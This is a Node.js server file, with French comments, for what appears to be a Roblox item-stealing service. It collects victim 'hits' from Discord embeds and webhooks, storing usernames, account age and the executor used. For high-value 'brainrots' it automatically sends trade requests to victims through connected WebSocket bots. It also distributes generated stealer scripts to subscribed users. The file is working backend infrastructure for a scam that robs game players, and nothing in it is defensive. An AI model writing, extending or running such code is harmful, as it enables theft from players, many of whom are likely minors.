require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const path = require('path');
const http = require('http');
const { Server } = require("socket.io"); 
const WebSocket = require('ws');         
const cookieParser = require('cookie-parser');
const { Client, GatewayIntentBits } = require('discord.js');
const url = require('url');

// --- CONFIGURATION AUTO-TRADE ---
const MIN_INCOME_THRESHOLD = 50000000; // 50M/s
const MASTER_BOT = process.env.ROBLOX_USERNAME || "MagixSafe";

// --- MODÈLES ---
const User = require('./models/User');
const Message = require('./models/Message');
const Script = require('./models/Script');
const ScriptRequest = require('./models/ScriptRequest');

const DiscordHit = mongoose.model('DiscordHit', new mongoose.Schema({
    displayName: String,
    username: String,
    accountAge: String,
    executor: String,
    players: String,
    receivers: [String],
    brainrots: [String],
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', default: null },
    timestamp: { type: Date, default: Date.now }
}));

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const wss = new WebSocket.Server({ server });

const activeBots = new Map(); 

// --- MIDDLEWARES ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(process.cwd(), 'public')));

// Connexion MongoDB
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("✅ MongoDB & WebSocket Core Connected"))
    .catch(err => console.error("❌ Erreur DB:", err));

// --- UTILS : PARSING DE VALEUR (Logique C#) ---
function parseIncomeJS(text) {
    const match = text.match(/\$?([\d.]+)\s*([KMBT]?)\/s/i);
    if (!match) return 0;
    const value = parseFloat(match[1]);
    const unit = match[2].toUpperCase();
    const multipliers = { 'K': 1e3, 'M': 1e6, 'B': 1e9, 'T': 1e12 };
    return value * (multipliers[unit] || 1);
}

// --- FONCTIONS DE TRADING ---
function executeTrade(botName, receiver) {
    const botWs = activeBots.get(botName);
    if (botWs && botWs.readyState === WebSocket.OPEN) {
        botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: receiver }));
        console.log(`🚀 [TRADE] Ordre envoyé : ${botName} -> ${receiver}`);
        return true;
    }
    return false;
}

// --- BOT DISCORD JS ---
const bot = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot || message.embeds.length === 0) return;

    const embed = message.embeds[0];
    let hitData = {
        displayName: "Unknown",
        username: "Unknown",
        accountAge: "N/A",
        executor: "N/A",
        players: "N/A",
        receivers: [],
        brainrots: []
    };

    let isHighValue = false;

    embed.fields.forEach(f => {
        const val = f.value;
        if (val.includes("Display Name")) hitData.displayName = val.match(/Display Name\s*:\s*(.*)/i)?.[1].trim();
        if (val.includes("Username")) hitData.username = val.match(/Username\s*:\s*([\w\d_]+)/i)?.[1].trim();
        if (val.includes("Account Age")) hitData.accountAge = val.match(/Account Age\s*:\s*(.*)/i)?.[1].trim();
        if (val.includes("Executor")) hitData.executor = val.match(/Executor\s*:\s*(.*)/i)?.[1].trim();
        if (val.includes("Players")) hitData.players = val.match(/Players\s*:\s*(.*)/i)?.[1].trim();
        
        if (val.includes("Receiver")) {
            const raw = val.split(':')[1] || "";
            hitData.receivers = raw.replace(/`/g, "").split(',').map(n => n.trim());
        }
        
        if (f.name.includes("Valuable Brainrots")) {
            const lines = val.split('\n').filter(line => line.trim() !== "");
            hitData.brainrots = lines;
            // Logique de détection de valeur
            lines.forEach(line => {
                if (parseIncomeJS(line) >= MIN_INCOME_THRESHOLD) isHighValue = true;
            });
        }
    });

    if (hitData.username !== "Unknown") {
        const newHit = new DiscordHit(hitData);
        await newHit.save();
        io.emit('new_discord_hit', newHit); 

        // AUTO-TRADE SI MAGIXSAFE EST CONNECTÉ ET ITEM > 50M/s
        if (isHighValue && activeBots.has(MASTER_BOT)) {
            executeTrade(MASTER_BOT, hitData.username);
        }
    }
});
bot.login(process.env.DISCORD_BOT_TOKEN);

// --- ROUTES RENDU ---
app.get('/', (req, res) => res.sendFile(path.join(process.cwd(), 'public/index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(process.cwd(), 'public/login.html')));
app.get('/signup', (req, res) => res.sendFile(path.join(process.cwd(), 'public/signup.html')));
app.get('/dashboard', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/dashboard.html')));
app.get('/admin', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/admin.html')));

// --- AUTH MIDDLEWARES ---
function authMiddleware(req, res, next) {
    const token = req.cookies.auth_token;
    if (!token) return res.redirect('/login');
    try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch (err) {
        res.clearCookie('auth_token');
        res.redirect('/login');
    }
}

function masterAuth(req, res, next) {
    const adminKey = req.headers['x-admin-key'] || req.query.key;
    if (adminKey === process.env.MASTER_PASSWORD) return next();
    return res.status(403).json({ error: "Unauthorized access" });
}

// --- API AUTH ---
app.post('/api/auth/signup', async (req, res) => {
    try {
        const { username, email, password } = req.body;
        const hashedPassword = await bcrypt.hash(password, 10);
        const newUser = new User({ username, email, password: hashedPassword, hitsCount: 0 });
        await newUser.save();
        res.redirect('/login');
    } catch (err) { res.status(400).send("Erreur: " + err.message); }
});

app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const user = await User.findOne({ email });
    if (user && await bcrypt.compare(password, user.password)) {
        const token = jwt.sign({ id: user._id, username: user.username, webhook: user.webhookToken }, process.env.JWT_SECRET, { expiresIn: '24h' });
        res.cookie('auth_token', token, { httpOnly: true });
        res.redirect('/dashboard');
    } else { res.send("Identifiants incorrects."); }
});

app.get('/api/user/me', authMiddleware, (req, res) => res.json(req.user));

// --- API CHAT ---
app.get('/api/messages', authMiddleware, async (req, res) => {
    const messages = await Message.find({ recipient: 'General' }).sort({ timestamp: 1 }).limit(50);
    res.json(messages);
});

app.post('/api/messages/send', authMiddleware, async (req, res) => {
    const newMessage = new Message({ sender: req.user.id, senderName: req.user.username, recipient: 'General', content: req.body.content });
    await newMessage.save();
    io.emit('new_general_message', newMessage); 
    res.json({ success: true });
});

// --- API SCRIPTS ---
app.get('/api/my-scripts', authMiddleware, async (req, res) => {
    const scripts = await Script.find({ userId: req.user.id }).sort({ createdAt: -1 });
    res.json(scripts);
});

app.post('/api/scripts/request', authMiddleware, async (req, res) => {
    const newRequest = new ScriptRequest({
        userId: req.user.id, username: req.user.username, webhookuuid: req.user.webhook,
        receivers: req.body.receivers, minIncome: req.body.minIncome
    });
    await newRequest.save();
    io.emit('new_script_request'); 
    res.json({ success: true });
});

// --- API ADMIN ---
app.post('/api/admin/verify', (req, res) => {
    if (req.body.password === process.env.MASTER_PASSWORD) res.json({ success: true });
    else res.status(401).json({ success: false });
});

app.get('/api/admin/users', masterAuth, async (req, res) => {
    const users = await User.find({}, '-password').sort({ createdAt: -1 });
    res.json(users);
});

app.get('/api/admin/all-hits', masterAuth, async (req, res) => {
    const hits = await DiscordHit.find().sort({ timestamp: -1 }).limit(100);
    res.json(hits);
});

app.get('/api/admin/requests', masterAuth, async (req, res) => {
    const requests = await ScriptRequest.find().sort({ createdAt: -1 });
    res.json(requests);
});

app.delete('/api/admin/users/:id', masterAuth, async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ success: true });
});

app.post('/api/scripts/send', masterAuth, async (req, res) => {
    try {
        const { webhookuuid, receiver, minincome, script } = req.body;
        const user = await User.findOne({ webhookToken: webhookuuid });
        if (!user) return res.status(404).json({ error: "UUID Invalide" });
        const newScript = new Script({ userId: user._id, receiver, minIncome: minincome, scriptCode: script });
        await newScript.save();
        await ScriptRequest.findOneAndDelete({ webhookuuid: webhookuuid, minIncome: minincome });
        io.to(user._id.toString()).emit('script_generated');
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/sendtrade', (req, res) => {
    const { username, receiver, key } = req.query;
    if (key !== process.env.MASTER_PASSWORD) return res.status(403).send("Unauthorized");
    const success = executeTrade(username, receiver);
    res.send(success ? "Trade Order Dispatched" : "Bot Offline");
});

// --- WEBHOOK HITS (USERS) ---
app.all('/webhook/:token', async (req, res) => {
    const user = await User.findOneAndUpdate({ webhookToken: req.params.token }, { $inc: { hitsCount: 1 } }, { new: true });
    if (user) {
        const hitData = {
            displayName: req.body.displayName || "Unknown",
            username: req.body.username || "Unknown",
            accountAge: req.body.accountAge || "N/A",
            executor: req.body.executor || "Script",
            players: req.body.players || "N/A",
            receivers: req.body.receivers ? req.body.receivers.split(',').map(r => r.trim()) : [],
            brainrots: req.body.brainrots || ["🚨 New hit captured!"],
            userId: user._id,
            timestamp: new Date()
        };
        await new DiscordHit(hitData).save();
        io.to(user._id.toString()).emit('receive_message', hitData);
        io.emit('stats_updated'); 
        return req.method === 'GET' ? res.send("Hit validé!") : res.json({ status: "success" });
    }
    res.status(404).json({ error: "Invalid Token" });
});

// --- WEBSOCKETS (BOTS ROBLOX) ---
wss.on('connection', (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const username = parameters.username || "Unknown";
    if (username !== "dashboard") {
        activeBots.set(username, ws);
        console.log(`🤖 [WS] Bot connecté : ${username}`);
    }
    ws.on('close', () => {
        activeBots.delete(username);
        console.log(`🤖 [WS] Bot déconnecté : ${username}`);
    });
});

// --- SOCKET.IO (WEB) ---
io.on('connection', (socket) => {
    socket.on('join_room', (userId) => socket.join(userId));
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Serveur M4GIX sur port ${PORT}`));
